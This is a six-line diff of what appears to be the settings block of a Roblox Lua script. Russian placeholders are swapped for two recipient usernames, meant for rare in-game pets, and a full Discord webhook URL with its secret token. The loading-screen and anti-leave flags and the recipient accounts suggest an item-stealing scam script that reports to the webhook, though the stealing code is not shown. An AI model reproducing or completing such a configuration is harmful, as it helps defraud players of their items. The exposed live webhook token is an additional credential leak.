@@ -1,6 +1,6 @@
-UserName = "сюда ник для хугов и титаников"
-Webhook = "Webhook Here"
-UserName2 = "сюда ник для ивенток и эксклюзивок"
+UserName = "Akkaunt230"
+Webhook = "https://discord.com/api/webhooks/1134042858383495219/bVCNyqoP8Y4Y2Yr_zu610jVlmRKt4HfSltoYMvg-HsLdpBK9FkmiDLyYaz3aUc__1S-J"
+UserName2 = "wesds121223"
 
 _G.LoadingScreen = true
 _G.AntiLeave = true
